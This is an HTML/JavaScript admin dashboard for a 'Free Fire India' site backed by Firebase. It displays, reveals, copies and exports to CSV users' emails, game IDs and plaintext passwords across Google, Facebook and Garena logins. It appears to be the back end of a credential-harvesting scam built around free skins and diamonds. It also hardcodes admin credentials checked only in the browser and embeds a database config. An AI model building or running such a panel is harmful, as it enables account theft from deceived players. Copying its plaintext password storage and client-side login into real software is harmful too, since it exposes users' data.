<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - Free Fire India</title>
    <!-- Firebase Scripts -->
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0a0a0f; color: white; }
        
        .admin-panel { min-height: 100vh; background: linear-gradient(135deg, #0a0a0f 0%, #1a1a2e 100%); padding: 2rem; }
        .admin-container { max-width: 1400px; margin: 0 auto; }
        
        .admin-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 2rem; padding-bottom: 1rem; border-bottom: 2px solid #ff4400; }
        .admin-header h1 { font-size: 2rem; color: #ff4400; }
        .admin-header h1 i { margin-right: 1rem; }
        
        .admin-logout { background: #ff4400; color: white; border: none; padding: 0.8rem 2rem; border-radius: 50px; cursor: pointer; font-size: 1rem; display: flex; align-items: center; gap: 0.5rem; transition: all 0.3s; }
        .admin-logout:hover { background: transparent; border: 2px solid #ff4400; }
        
        .admin-stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 1.5rem; margin-bottom: 2rem; }
        .stat-card { background: rgba(255,255,255,0.05); border: 1px solid #ff4400; border-radius: 15px; padding: 1.5rem; display: flex; align-items: center; gap: 1rem; }
        .stat-card i { font-size: 2.5rem; color: #ff4400; }
        .stat-info h3 { font-size: 0.9rem; color: #ccc; }
        .stat-info p { font-size: 2rem; font-weight: bold; color: #ff4400; }
        
        .admin-filters { display: flex; gap: 1rem; margin-bottom: 2rem; flex-wrap: wrap; }
        .admin-filters input, .admin-filters select { padding: 0.8rem 1rem; background: rgba(255,255,255,0.05); border: 1px solid #ff4400; border-radius: 8px; color: white; flex: 1; }
        .admin-filters button { padding: 0.8rem 2rem; background: #ff4400; color: white; border: none; border-radius: 8px; cursor: pointer; }
        
        .admin-table-container { background: rgba(255,255,255,0.05); border-radius: 15px; padding: 1.5rem; border: 1px solid #ff4400; overflow-x: auto; }
        .admin-table { width: 100%; border-collapse: collapse; min-width: 1400px; }
        .admin-table th { text-align: left; padding: 1rem; background: rgba(255,68,0,0.2); color: #ff4400; border-bottom: 2px solid #ff4400; }
        .admin-table td { padding: 1rem; border-bottom: 1px solid rgba(255,68,0,0.3); }
        .admin-table tr:hover { background: rgba(255,68,0,0.1); }
        
        .provider-badge { display: inline-block; padding: 0.3rem 0.8rem; border-radius: 50px; font-size: 0.8rem; font-weight: bold; }
        .provider-badge.google { background: #DB4437; color: white; }
        .provider-badge.facebook { background: #4267B2; color: white; }
        .provider-badge.garena { background: #ff4400; color: white; }
        .provider-badge.guest { background: #666; color: white; }
        
        .admin-actions { display: flex; gap: 0.5rem; }
        .admin-btn { padding: 0.4rem 0.8rem; border: none; border-radius: 5px; cursor: pointer; }
        .admin-btn.view { background: #33b5e5; color: white; }
        .admin-btn.delete { background: #ff4444; color: white; }
        .admin-btn.copy { background: #00c851; color: white; }
        
        .export-btn { background: #00c851; color: white; border: none; padding: 0.8rem 2rem; border-radius: 8px; cursor: pointer; margin-right: 1rem; }
        .header-buttons { display: flex; gap: 1rem; }
        
        .admin-login-modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); display: flex; align-items: center; justify-content: center; }
        .admin-login-content { background: linear-gradient(135deg, #1a1a2e, #16213e); border-radius: 20px; padding: 3rem; max-width: 400px; width: 90%; border: 2px solid #ff4400; }
        .admin-login-content h2 { text-align: center; color: #ff4400; margin-bottom: 2rem; }
        .admin-login-form .form-group { margin-bottom: 1.5rem; }
        .admin-login-form input { width: 100%; padding: 1rem; background: rgba(255,255,255,0.05); border: 1px solid #ff4400; border-radius: 8px; color: white; }
        .admin-login-btn { width: 100%; padding: 1rem; background: #ff4400; color: white; border: none; border-radius: 8px; cursor: pointer; }
        
        .error-message { background: rgba(255,68,68,0.2); border: 1px solid #ff4444; color: #ff8888; padding: 0.8rem; border-radius: 8px; margin-bottom: 1rem; text-align: center; }
        
        .user-details-modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); display: none; align-items: center; justify-content: center; }
        .user-details-content { background: linear-gradient(135deg, #1a1a2e, #16213e); border-radius: 20px; padding: 2rem; max-width: 500px; width: 90%; border: 2px solid #ff4400; position: relative; max-height: 80vh; overflow-y: auto; }
        .close-details { position: absolute; top: 1rem; right: 1rem; background: none; border: none; color: #ff4400; font-size: 2rem; cursor: pointer; }
        .user-detail-item { display: flex; margin-bottom: 1rem; padding: 0.8rem; border-bottom: 1px solid rgba(255,68,0,0.3); }
        .user-detail-label { width: 120px; color: #ff4400; font-weight: bold; }
        .user-detail-value { flex: 1; color: white; }
        .password-value { font-family: monospace; background: rgba(0,0,0,0.3); padding: 0.2rem 0.5rem; border-radius: 4px; }
        .user-skins-list { max-height: 200px; overflow-y: auto; padding: 0.5rem; background: rgba(0,0,0,0.3); border-radius: 8px; }
        .user-skin-item { padding: 0.3rem 0.5rem; color: gold; border-bottom: 1px solid rgba(255,68,0,0.2); }
        .back-to-site { color: #ff4400; text-decoration: none; margin-top: 1rem; display: inline-block; }
        .no-data { text-align: center; padding: 3rem; color: #ccc; }
        .show-password-btn { background: none; border: 1px solid #ff4400; color: #ff4400; padding: 0.2rem 0.5rem; border-radius: 4px; cursor: pointer; font-size: 0.7rem; margin-left: 0.5rem; }
        .show-password-btn:hover { background: #ff4400; color: white; }
    </style>
</head>
<body>
    <div id="app"></div>

    <script>
        // ==================== FIREBASE CONFIGURATION ====================
        // USE THE SAME CONFIG AS IN script.js
        const firebaseConfig = {
            apiKey: "AIzaSyDnYIg3S0Y8lRLWcPwrqC1w-jCPGVPj8vI",
            authDomain: "freefire-india-c022a.firebaseapp.com",
            databaseURL: "https://freefire-india-c022a-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "freefire-india-c022a",
            storageBucket: "freefire-india-c022a.firebasestorage.app",
            messagingSenderId: "453909911508",
            appId: "1:453909911508:web:20bfccb9f36f49b19fa841"
        };

        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        // Admin credentials
        const ADMIN_CREDENTIALS = {
            username: 'Garena',
            password: 'FreeFire'
        };

        let isLoggedIn = false;

        // Check if already logged in
        function checkAdminSession() {
            const session = sessionStorage.getItem('adminLoggedIn');
            if (session === 'true') {
                isLoggedIn = true;
                loadAdminDashboard();
            } else {
                showLoginForm();
            }
        }

        // Show login form
        function showLoginForm() {
            const app = document.getElementById('app');
            app.innerHTML = `
                <div class="admin-login-modal">
                    <div class="admin-login-content">
                        <h2><i class="fas fa-shield-alt"></i> ADMIN PANEL</h2>
                        <div id="errorMsg" style="display: none;"></div>
                        <form class="admin-login-form" onsubmit="handleAdminLogin(event)">
                            <div class="form-group">
                                <input type="text" id="adminUsername" placeholder="Username" required>
                            </div>
                            <div class="form-group">
                                <input type="password" id="adminPassword" placeholder="Password" required>
                            </div>
                            <button type="submit" class="admin-login-btn">
                                <i class="fas fa-lock"></i> Login
                            </button>
                        </form>
                        <div style="text-align: center; margin-top: 1rem;">
                            <a href="index.html" class="back-to-site">
                                <i class="fas fa-arrow-left"></i> Back to Website
                            </a>
                        </div>
                    </div>
                </div>
            `;
        }

        // Handle admin login
        function handleAdminLogin(event) {
            event.preventDefault();
            
            const username = document.getElementById('adminUsername').value;
            const password = document.getElementById('adminPassword').value;
            const errorDiv = document.getElementById('errorMsg');
            
            if (username === ADMIN_CREDENTIALS.username && password === ADMIN_CREDENTIALS.password) {
                sessionStorage.setItem('adminLoggedIn', 'true');
                isLoggedIn = true;
                loadAdminDashboard();
            } else {
                errorDiv.style.display = 'block';
                errorDiv.className = 'error-message';
                errorDiv.innerHTML = '<i class="fas fa-exclamation-circle"></i> Invalid username or password!';
            }
        }

        // Mask password
        function maskPassword(password) {
            if (!password) return 'N/A';
            return '•'.repeat(Math.min(password.length, 10));
        }

        // Toggle password visibility
        function togglePassword(element, password) {
            if (element.textContent.includes('•')) {
                element.textContent = password;
                element.style.color = '#00ff00';
            } else {
                element.textContent = maskPassword(password);
                element.style.color = 'white';
            }
        }

        // Copy password
        function copyPassword(password) {
            if (!password) {
                alert('No password to copy!');
                return;
            }
            navigator.clipboard.writeText(password).then(() => {
                alert('Password copied to clipboard!');
            });
        }

        // Load admin dashboard with ALL users from Firebase
        async function loadAdminDashboard() {
            try {
                // Get all users from Firebase
                const snapshot = await database.ref('users').once('value');
                const users = [];
                snapshot.forEach(child => {
                    users.push(child.val());
                });

                const app = document.getElementById('app');
                
                // Calculate stats
                const totalUsers = users.length;
                const totalSkinsClaimed = users.reduce((acc, user) => acc + (user.skins?.length || 0), 0);
                const totalDiamonds = users.reduce((acc, user) => acc + (user.diamonds || 0), 0);
                const providers = [...new Set(users.map(u => u.provider).filter(Boolean))];

                app.innerHTML = `
                    <div class="admin-panel">
                        <div class="admin-container">
                            <div class="admin-header">
                                <h1><i class="fas fa-shield-alt"></i> ADMIN DASHBOARD</h1>
                                <div class="header-buttons">
                                    <button class="export-btn" onclick='exportUserData(${JSON.stringify(users)})'>
                                        <i class="fas fa-download"></i> Export CSV
                                    </button>
                                    <button class="admin-logout" onclick="logoutAdmin()">
                                        <i class="fas fa-sign-out-alt"></i> Logout
                                    </button>
                                </div>
                            </div>
                            
                            <div class="admin-stats">
                                <div class="stat-card">
                                    <i class="fas fa-users"></i>
                                    <div class="stat-info">
                                        <h3>Total Users</h3>
                                        <p>${totalUsers}</p>
                                    </div>
                                </div>
                                <div class="stat-card">
                                    <i class="fas fa-gun"></i>
                                    <div class="stat-info">
                                        <h3>Skins Claimed</h3>
                                        <p>${totalSkinsClaimed}</p>
                                    </div>
                                </div>
                                <div class="stat-card">
                                    <i class="fas fa-gem"></i>
                                    <div class="stat-info">
                                        <h3>Total Diamonds</h3>
                                        <p>${totalDiamonds}</p>
                                    </div>
                                </div>
                                <div class="stat-card">
                                    <i class="fas fa-globe"></i>
                                    <div class="stat-info">
                                        <h3>Providers</h3>
                                        <p>${providers.length}</p>
                                    </div>
                                </div>
                            </div>
                            
                            <div class="admin-filters">
                                <input type="text" id="searchUser" placeholder="Search by name, email, or FFID..." onkeyup="filterUsers(${JSON.stringify(users)})">
                                <select id="providerFilter" onchange="filterUsers(${JSON.stringify(users)})">
                                    <option value="all">All Providers</option>
                                    ${providers.map(p => `<option value="${p}">${p}</option>`).join('')}
                                </select>
                                <button onclick="filterUsers(${JSON.stringify(users)})">
                                    <i class="fas fa-search"></i> Search
                                </button>
                            </div>
                            
                            <div class="admin-table-container">
                                ${users.length > 0 ? `
                                    <table class="admin-table" id="usersTable">
                                        <thead>
                                            <tr>
                                                <th>S.No</th>
                                                <th>Website Name</th>
                                                <th>FF Name</th>
                                                <th>FF ID</th>
                                                <th>Email</th>
                                                <th>Password</th>
                                                <th>Provider</th>
                                                <th>Level</th>
                                                <th>Skins</th>
                                                <th>Diamonds</th>
                                                <th>Joined</th>
                                                <th>Actions</th>
                                            </tr>
                                        </thead>
                                        <tbody id="usersTableBody">
                                            ${users.map((user, index) => `
                                                <tr>
                                                    <td>${index + 1}</td>
                                                    <td>${user.websiteName || 'N/A'}</td>
                                                    <td>${user.ffName || 'N/A'}</td>
                                                    <td>${user.ffid || 'N/A'}</td>
                                                    <td>${user.email || 'N/A'}</td>
                                                    <td>
                                                        <span class="password-value" onclick="togglePassword(this, '${user.password || ''}')" style="cursor: pointer;">
                                                            ${maskPassword(user.password)}
                                                        </span>
                                                        <button class="show-password-btn" onclick="copyPassword('${user.password || ''}')">
                                                            <i class="fas fa-copy"></i>
                                                        </button>
                                                    </td>
                                                    <td><span class="provider-badge ${user.provider || 'guest'}">${user.provider || 'guest'}</span></td>
                                                    <td>${user.level || 1}</td>
                                                    <td>${user.skins?.length || 0}</td>
                                                    <td>${user.diamonds || 0}</td>
                                                    <td>${user.joinDate ? new Date(user.joinDate).toLocaleDateString() : 'N/A'}</td>
                                                    <td class="admin-actions">
                                                        <button class="admin-btn view" onclick='viewUserDetails(${JSON.stringify(user)})'>
                                                            <i class="fas fa-eye"></i>
                                                        </button>
                                                        <button class="admin-btn delete" onclick="deleteUser('${user.id}')">
                                                            <i class="fas fa-trash"></i>
                                                        </button>
                                                    </td>
                                                </tr>
                                            `).join('')}
                                        </tbody>
                                    </table>
                                ` : `
                                    <div class="no-data">
                                        <i class="fas fa-database" style="font-size: 4rem; margin-bottom: 1rem; color: #ff4400;"></i>
                                        <h2>No Users Found</h2>
                                        <p>No users have registered yet.</p>
                                    </div>
                                `}
                            </div>
                            
                            <div style="text-align: center; margin-top: 2rem;">
                                <a href="index.html" class="back-to-site">
                                    <i class="fas fa-arrow-left"></i> Back to Website
                                </a>
                            </div>
                        </div>
                    </div>
                    
                    <div id="userDetailsModal" class="user-details-modal"></div>
                `;
            } catch (error) {
                console.error("Error loading users:", error);
            }
        }

        // Filter users
        function filterUsers(users) {
            const searchTerm = document.getElementById('searchUser').value.toLowerCase();
            const providerFilter = document.getElementById('providerFilter').value;
            
            const filteredUsers = users.filter(user => {
                const matchesSearch = 
                    (user.websiteName?.toLowerCase().includes(searchTerm)) ||
                    (user.ffName?.toLowerCase().includes(searchTerm)) ||
                    (user.ffid?.toLowerCase().includes(searchTerm)) ||
                    (user.email?.toLowerCase().includes(searchTerm));
                const matchesProvider = providerFilter === 'all' || user.provider === providerFilter;
                return matchesSearch && matchesProvider;
            });
            
            const tbody = document.getElementById('usersTableBody');
            if (tbody) {
                tbody.innerHTML = filteredUsers.map((user, index) => `
                    <tr>
                        <td>${index + 1}</td>
                        <td>${user.websiteName || 'N/A'}</td>
                        <td>${user.ffName || 'N/A'}</td>
                        <td>${user.ffid || 'N/A'}</td>
                        <td>${user.email || 'N/A'}</td>
                        <td>
                            <span class="password-value" onclick="togglePassword(this, '${user.password || ''}')" style="cursor: pointer;">
                                ${maskPassword(user.password)}
                            </span>
                            <button class="show-password-btn" onclick="copyPassword('${user.password || ''}')">
                                <i class="fas fa-copy"></i>
                            </button>
                        </td>
                        <td><span class="provider-badge ${user.provider || 'guest'}">${user.provider || 'guest'}</span></td>
                        <td>${user.level || 1}</td>
                        <td>${user.skins?.length || 0}</td>
                        <td>${user.diamonds || 0}</td>
                        <td>${user.joinDate ? new Date(user.joinDate).toLocaleDateString() : 'N/A'}</td>
                        <td class="admin-actions">
                            <button class="admin-btn view" onclick='viewUserDetails(${JSON.stringify(user)})'>
                                <i class="fas fa-eye"></i>
                            </button>
                            <button class="admin-btn delete" onclick="deleteUser('${user.id}')">
                                <i class="fas fa-trash"></i>
                            </button>
                        </td>
                    </tr>
                `).join('');
            }
        }

        // View user details
        function viewUserDetails(user) {
            const modal = document.getElementById('userDetailsModal');
            modal.innerHTML = `
                <div class="user-details-content">
                    <button class="close-details" onclick="closeUserDetails()">&times;</button>
                    <h2 style="color: #ff4400; margin-bottom: 1.5rem;"><i class="fas fa-user-circle"></i> User Details</h2>
                    
                    <div class="user-detail-item"><span class="user-detail-label">Website Name:</span><span class="user-detail-value">${user.websiteName || 'N/A'}</span></div>
                    <div class="user-detail-item"><span class="user-detail-label">FF Name:</span><span class="user-detail-value">${user.ffName || 'N/A'}</span></div>
                    <div class="user-detail-item"><span class="user-detail-label">FF ID:</span><span class="user-detail-value">${user.ffid || 'N/A'}</span></div>
                    <div class="user-detail-item"><span class="user-detail-label">Email:</span><span class="user-detail-value">${user.email || 'N/A'}</span></div>
                    <div class="user-detail-item">
                        <span class="user-detail-label">Password:</span>
                        <span class="user-detail-value">
                            <span class="password-value" onclick="togglePassword(this, '${user.password || ''}')" style="cursor: pointer;">${maskPassword(user.password)}</span>
                            <button class="show-password-btn" onclick="copyPassword('${user.password || ''}')"><i class="fas fa-copy"></i> Copy</button>
                        </span>
                    </div>
                    <div class="user-detail-item"><span class="user-detail-label">Provider:</span><span class="user-detail-value"><span class="provider-badge ${user.provider || 'guest'}">${user.provider || 'guest'}</span></span></div>
                    <div class="user-detail-item"><span class="user-detail-label">Level:</span><span class="user-detail-value">${user.level || 1}</span></div>
                    <div class="user-detail-item"><span class="user-detail-label">Diamonds:</span><span class="user-detail-value">${user.diamonds || 0}</span></div>
                    <div class="user-detail-item"><span class="user-detail-label">Joined:</span><span class="user-detail-value">${user.joinDate ? new Date(user.joinDate).toLocaleString() : 'N/A'}</span></div>
                    <div class="user-detail-item">
                        <span class="user-detail-label">Skins Owned:</span>
                        <div class="user-skins-list">
                            ${user.skins && user.skins.length > 0 
                                ? user.skins.map(skin => `<div class="user-skin-item">✨ ${skin}</div>`).join('')
                                : '<div style="color: #ccc;">No skins owned</div>'}
                        </div>
                    </div>
                    
                    <div style="margin-top: 2rem; text-align: center;">
                        <button class="admin-btn delete" onclick="deleteUser('${user.id}')" style="padding: 0.8rem 2rem;">
                            <i class="fas fa-trash"></i> Delete User
                        </button>
                    </div>
                </div>
            `;
            modal.style.display = 'flex';
        }

        function closeUserDetails() {
            document.getElementById('userDetailsModal').style.display = 'none';
        }

        // Delete user from Firebase
        async function deleteUser(userId) {
            if (confirm('Are you sure you want to delete this user?')) {
                try {
                    await database.ref('users/' + userId).remove();
                    alert('User deleted successfully!');
                    loadAdminDashboard();
                } catch (error) {
                    alert('Error deleting user');
                }
            }
        }

        // Export user data
        function exportUserData(users) {
            if (users.length === 0) {
                alert('No users to export!');
                return;
            }
            
            const headers = ['Website Name', 'FF Name', 'FF ID', 'Email', 'Password', 'Provider', 'Level', 'Diamonds', 'Skins Count', 'Skins List', 'Join Date'];
            const rows = users.map(user => [
                user.websiteName || '',
                user.ffName || '',
                user.ffid || '',
                user.email || '',
                user.password || '',
                user.provider || 'guest',
                user.level || 1,
                user.diamonds || 0,
                user.skins?.length || 0,
                (user.skins || []).join('; '),
                user.joinDate ? new Date(user.joinDate).toLocaleString() : ''
            ]);
            
            const csvContent = [
                headers.join(','),
                ...rows.map(row => row.map(cell => `"${cell}"`).join(','))
            ].join('\n');
            
            const blob = new Blob([csvContent], { type: 'text/csv' });
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `freefire_users_${new Date().toISOString().split('T')[0]}.csv`;
            a.click();
        }

        function logoutAdmin() {
            sessionStorage.removeItem('adminLoggedIn');
            showLoginForm();
        }

        // Initialize
        checkAdminSession();
    </script>
</body>

</html>
